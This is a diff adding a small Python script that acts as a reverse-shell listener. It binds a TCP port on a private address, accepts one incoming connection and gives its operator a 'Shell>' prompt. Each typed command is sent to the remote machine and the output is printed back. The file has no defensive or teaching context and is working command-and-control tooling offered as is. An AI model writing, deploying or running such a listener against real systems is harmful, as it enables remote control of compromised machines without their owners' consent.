@@ -1,0 +1,27 @@
+import os
+import socket
+
+def connecting():
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("10.0.0.240", 8080))
+    s.listen(1)
+    print("="*60)
+    print(" TCP TUNING THE CONNECTION ATTEMPTS")
+    print("="*60)
+    print('[+] Listening for income TCP connection on port 8080')
+    conn, addr = s.accept()
+    print('[+]We got a connection from', addr)
+
+    while True:
+        print("="*60)
+        command = input("Shell> ")
+        if 'terminate' in command:
+            conn.send('terminate'.encode())
+            break
+        else:
+            conn.send(command.encode())
+            print(conn.recv(5000).decode())
+def main():
+    connecting()
+main()
